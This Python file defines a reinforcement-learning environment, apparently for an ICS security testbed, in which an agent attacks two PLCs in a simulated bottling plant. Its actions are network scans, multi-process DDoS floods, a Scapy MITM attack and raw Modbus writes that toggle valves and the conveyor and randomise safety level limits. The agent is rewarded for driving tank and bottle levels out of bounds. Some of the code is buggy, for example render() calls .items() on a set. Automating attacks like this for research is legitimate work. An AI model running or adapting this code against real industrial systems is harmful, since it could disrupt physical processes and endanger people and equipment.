import gymnasium as gym
from gymnasium import spaces
import numpy as np
from ics_sim.protocol import ModbusBase
from Configs import TAG
from pyModbusTCP.client import ModbusClient
import subprocess
import random
import os
import time

class SimulatoreAmbiente(gym.Env):
    def __init__(self, first_plc_ip="192.168.0.11", second_plc_ip="192.168.0.12", plc_port=502):
        super(SimulatoreAmbiente, self).__init__()

        self.firstPLC = ModbusClient(first_plc_ip, plc_port)
        self.secondPLC = ModbusClient(second_plc_ip, plc_port)
        self.modbus = ModbusBase(2, 4)

        # TAG_LIST con i parametri iniziali
        self.TAG_LIST = {
            TAG.TAG_TANK_INPUT_VALVE_STATUS,
            TAG.TAG_TANK_INPUT_VALVE_MODE,
            TAG.TAG_TANK_LEVEL_VALUE,
            TAG.TAG_TANK_LEVEL_MIN,
            TAG.TAG_TANK_LEVEL_MAX,
            TAG.TAG_TANK_OUTPUT_VALVE_STATUS,
            TAG.TAG_TANK_INPUT_VALVE_MODE,
            TAG.TAG_TANK_OUTPUT_FLOW_VALUE,
            TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS,
            TAG.TAG_CONVEYOR_BELT_ENGINE_MODE,
            TAG.TAG_BOTTLE_LEVEL_VALUE,
            TAG.TAG_BOTTLE_LEVEL_MAX,
            TAG.TAG_BOTTLE_DISTANCE_TO_FILLER_VALUE,
        }

        self.observation_space = spaces.Box(low=0, high=1, shape=(13,), dtype=np.float32)

        self.action_space = spaces.Discrete(13) 

        self.valore_simulatore = self.get_real_time_data()

    def step(self, action):
        reward = 0
        done = False

        rewards_map = {
        0: 1,  # Azione 0
        1: 3,  # Azione 1
        2: 4,  # Azione 2
        3: 5,  # Azione 3
        4: 4,  # Azione 4
        5: 4,  # Azione 5
        6: 4,  # Azione 6
        7: 4,  # Azione 7
        8: 4,  # Azione 8
        9: 4,  # Azione 9
        10: 4, # Azione 10
        11: 3, # Azione 11
        12: 4, # Azione 12
        # 13: 4, # Azione 13
        # 14: 2, # Azione 14
        # 15: 2, # Azione 15
        # 16: 2  # Azione 16
        }
        
        # migliori controlli e ricompense! analizza tutti i casi. stabilisci ricompense in scala.
        while not done: # scansione nmap
            if action == 0:
                target = "192.168.0.1/24"
                bash_command = ['nmap',
                    '-p-',
                    target]
                subprocess.run(bash_command)
                reward = reward + rewards_map.get(action, 0)
                break
            elif action == 1: # DDOS primo PLC
                print("DDos primo PLC")
                ddos_agent_path='DDosAgent.py'
                timeout=60
                num_process=10 
                target='192.168.0.11'
                processes_args = []
                processes = []
                log_file_directory = '/tmp'
                if not os.path.exists(log_file_directory):
                    os.makedirs(log_file_directory)
                for i in range(num_process):
                    log_file_path = os.path.join(log_file_directory, f'log_agent{i}.txt')
                    processes_args.append(f'python3 {ddos_agent_path} Agent{i} --timeout {timeout} --target {target} --log_path {log_file_path}'.split(' '))
                for i in range(num_process):
                    processes.append(subprocess.Popen(processes_args[i]))
                for i in range(num_process):
                    processes[i].wait()
                
                reward = reward + rewards_map.get(action, 1)
                break
            elif action == 2: # Input tank ON
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_STATUS)['id']), self.modbus.encode(1))
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus.encode(2))
                print("Input tank ON")
                reward = reward + rewards_map.get(action, 2)
                break
            elif action == 3: # Attacco MITM (da cambiare nello script)
                print("Attacco MITM su 192.168.0.1/24")
                timeout=30
                noise=0.1
                target='192.168.0.1/24'
                log_file_directory = '/tmp'
                if not os.path.exists(log_file_directory):
                    os.makedirs(log_file_directory)
                log_file_path = os.path.join(log_file_directory, f'log_mitm.txt')
                subprocess.run(['echo', '0'], stdout=open('/proc/sys/net/ipv4/ip_forward',"w"))
                bash_command = ['python3',
                                'ics_sim/ScapyAttacker.py',
                                '--attack', 'mitm',
                                '--output', log_file_path,
                                '--timeout', str(timeout),
                                '--parameter', str(noise),
                                '--target', target]
                print(bash_command)
                subprocess.run(bash_command)
                subprocess.run(['echo', '1'], stdout=open('/proc/sys/net/ipv4/ip_forward',"w"))
                reward = reward + rewards_map.get(action, 3)
                break 
            elif action == 4: # Output tank su ON 
                print()
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_STATUS)['id']), self.modbus.encode(1))
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus.encode(2))
                print("Output tank su ON")
                reward = reward + rewards_map.get(action, 4)
                break
            elif action == 5: # Nastro trasportatore su ON
                self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS)['id']), self.modbus.encode(1))
                self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus.encode(2))
                print("Nastro trasportatore su ON")
                reward = reward + rewards_map.get(action, 5)
                break
            elif action == 6: # Nastro trasportatore su OFF
                self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus.encode(1))
                reward = reward + rewards_map.get(action, 6)
                print("Nastro trasportatore su OFF")
                break
            elif action == 7: # Output tank su OFF
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus.encode(1))
                reward = reward + rewards_map.get(action, 7)
                print("Output tank su OFF")
                break
            elif action == 8: # Regolazione dei valori di massimo e di minimo in modo casuale
                rand1 = random.randint(0, 1)
                rand2 = random.randint(2, 3)
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MIN)['id']), self.modbus.encode(rand1))
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MAX)['id']), self.modbus.encode(rand2))
                reward = reward + rewards_map.get(action, 8)
                print(f"Tank level MIN: {rand1}, MAX: {rand2}")
                break
            elif action == 9: # Input tank OFF
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus.encode(1))
                reward = reward + rewards_map.get(action, 9)
                print("Input tank OFF")
                break
            elif action == 10:
                rand3 = random.randint(0, 4)
                self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_LEVEL_MAX)['id']), self.modbus.encode(rand3))
                reward = reward + rewards_map.get(action, 10)
                print(f"Capacità massima della bottiglia impostata a: {rand3}")
                break
            elif action == 11: # DDos secondo PLC 
                print("DDos secondo PLC")
                ddos_agent_path='DDosAgent.py'
                timeout=60
                num_process=10 
                target='192.168.0.12'
                processes_args = []
                processes = []
                log_file_directory = '/tmp'
                if not os.path.exists(log_file_directory):
                    os.makedirs(log_file_directory)
                for i in range(num_process):
                    log_file_path = os.path.join(log_file_directory, f'log_agent{i}.txt')
                    processes_args.append(f'python3 {ddos_agent_path} Agent{i} --timeout {timeout} --target {target} --log_path {log_file_path}'.split(' '))
                for i in range(num_process):
                    processes.append(subprocess.Popen(processes_args[i]))
                for i in range(num_process):
                    processes[i].wait()
                
                reward = reward + rewards_map.get(action, 11)
                break
            elif action == 12: # Pompa tank OFF
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_STATUS)['id']), self.modbus.encode(0))
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus.encode(1))
                print("Pompa tank OFF")
                reward = reward + rewards_map.get(action, 12)
                break
            # elif action == 13: # Replay attack tra HMI2 e il primo PLC
            #     print("Replay attack tra HMI2 e il primo PLC")
            #     timeout = 15
            #     replay_count = 3
            #     target='192.168.0.11,192.168.0.22'
            #     log_file_directory = '/tmp'
            #     if not os.path.exists(log_file_directory):
            #         os.makedirs(log_file_directory)
            #     log_file_path = os.path.join(log_file_directory, f'log_replay.txt')
            #     bash_command = ['python3',
            #         'ics_sim/ScapyAttacker.py',
            #         '--attack', 'replay',
            #         '--output', log_file_path,
            #         '--timeout', str(timeout),
            #         '--parameter', str(replay_count),
            #         '--target', target]
            #     print(bash_command)
            #     subprocess.run(bash_command)
            #     reward = reward + rewards_map.get(action, 13)
            #     break
            # elif action == 14: # Replay attack tra HMI1 e il primo PLC
            #     print("Replay attack tra HMI1 e il primo PLC")
            #     timeout = 15
            #     replay_count = 3
            #     target='192.168.0.11,192.168.0.21'
            #     log_file_directory = '/tmp'
            #     if not os.path.exists(log_file_directory):
            #         os.makedirs(log_file_directory)
            #     log_file_path = os.path.join(log_file_directory, f'log_replay.txt')
            #     bash_command = ['python3',
            #         'ics_sim/ScapyAttacker.py',
            #         '--attack', 'replay',
            #         '--output', log_file_path,
            #         '--timeout', str(timeout),
            #         '--parameter', str(replay_count),
            #         '--target', target]
            #     print(bash_command)
            #     subprocess.run(bash_command)
            #     reward = reward + rewards_map.get(action, 14)
            #     break
            # elif action == 15: # Replay attack tra HMI2 e il secondo PLC
            #     print("Replay attack tra HMI2 e il secondo PLC")
            #     timeout = 15
            #     replay_count = 3
            #     target='192.168.0.12,192.168.0.22'
            #     log_file_directory = '/tmp'
            #     if not os.path.exists(log_file_directory):
            #         os.makedirs(log_file_directory)
            #     log_file_path = os.path.join(log_file_directory, f'log_replay.txt')
            #     bash_command = ['python3',
            #         'ics_sim/ScapyAttacker.py',
            #         '--attack', 'replay',
            #         '--output', log_file_path,
            #         '--timeout', str(timeout),
            #         '--parameter', str(replay_count),
            #         '--target', target]
            #     print(bash_command)
            #     subprocess.run(bash_command)
            #     reward = reward + rewards_map.get(action, 15)
            #     break
            # elif action == 16: # Replay attack tra HMI1 e il secondo PLC
            #     print("Replay attack tra HMI1 e il secondo PLC")
            #     timeout = 15
            #     replay_count = 3
            #     target='192.168.0.12,192.168.0.21'
            #     log_file_directory = '/tmp'
            #     if not os.path.exists(log_file_directory):
            #         os.makedirs(log_file_directory)
            #     log_file_path = os.path.join(log_file_directory, f'log_replay.txt')
            #     bash_command = ['python3',
            #         'ics_sim/ScapyAttacker.py',
            #         '--attack', 'replay',
            #         '--output', log_file_path,
            #         '--timeout', str(timeout),
            #         '--parameter', str(replay_count),
            #         '--target', target]
            #     print(bash_command)
            #     subprocess.run(bash_command)
            #     reward = reward + rewards_map.get(action, 16)
            #     break
        
        
        self.valore_simulatore = self.get_real_time_data()
        if self.valore_simulatore[2] < self.valore_simulatore[3] or self.valore_simulatore[2] > self.valore_simulatore[4] or self.valore_simulatore[10] > self.valore_simulatore[11] or self.valore_simulatore[11] < self.valore_simulatore[10]:
            reward = reward + 10
            done = True
        if self.valore_simulatore[1] == self.valore_simulatore[6] or self.valore_simulatore[1] == self.valore_simulatore[9] or self.valore_simulatore[6] == self.valore_simulatore[9]:
            if self.valore_simulatore[1] == 1 and self.valore_simulatore[6] == 1:
                reward = reward - 10
                done = True
            elif self.valore_simulatore[1] == 1 and self.valore_simulatore[9] == 1:
                reward = reward - 10
                done = True
            elif self.valore_simulatore[6] == 1 and self.valore_simulatore[9] == 1:
                reward = reward - 10
                done = True
            elif self.valore_simulatore[6] == 2 and self.valore_simulatore[9] == 2:
                reward = reward + 5
                done = True
        if self.valore_simulatore[1] == 3 and self.valore_simulatore[6] == 3 and self.valore_simulatore[9] == 2:
            reward = reward - 10
        
        reward = reward - 2

        print("Aspetto 5 secondi...")
        time.sleep(5)
        
        return self.valore_simulatore, reward, done, {}, {}


    def get_real_time_data(self):
        response = []
        response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_STATUS)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_VALUE)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MIN)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MAX)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_STATUS)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_FLOW_VALUE)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_LEVEL_VALUE)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_LEVEL_MAX)['id']), self.modbus._word_num)))
        response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_DISTANCE_TO_FILLER_VALUE)['id']), self.modbus._word_num)))
        return response

    
    def reset(self, seed=random.randint(0, 1000)):
        while round(self.get_real_time_data()[2], 1) != 5.8:
            if self.get_real_time_data()[2] < 5.8:
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus.encode(2))
                self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus.encode(1))
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus.encode(1))
            elif self.get_real_time_data()[2] > 5.8:
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus.encode(1))
                self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus.encode(1))
                self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus.encode(2))

        self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_STATUS)['id']), self.modbus.encode(1))
        self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus.encode(3))
        self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MIN)['id']), self.modbus.encode(3))
        self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MAX)['id']), self.modbus.encode(7))
        self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_VALUE)['id']), self.modbus.encode(5.8))
        self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_STATUS)['id']), self.modbus.encode(0))
        self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus.encode(3))
        self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_FLOW_VALUE)['id']), self.modbus.encode(0))
        self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS)['id']), self.modbus.encode(0))
        self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus.encode(3))
        self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_LEVEL_VALUE)['id']), self.modbus.encode(0))
        self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_LEVEL_MAX)['id']), self.modbus.encode(1.8))
        self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_DISTANCE_TO_FILLER_VALUE)['id']), self.modbus.encode(0))
        self.valore_simulatore = self.get_real_time_data()
        
        return self.valore_simulatore, {}

    def render(self, mode='human'):
        if mode == 'human':
            print("Stato corrente del sistema:")
            for tag_name, tag_info in self.TAG_LIST.items():
                print(f"{tag_name}: {self.valore_simulatore[tag_info['id']]}")
        elif mode == 'rgb_array':
            pass
        else:
            super(SimulatoreAmbiente, self).render(mode=mode)
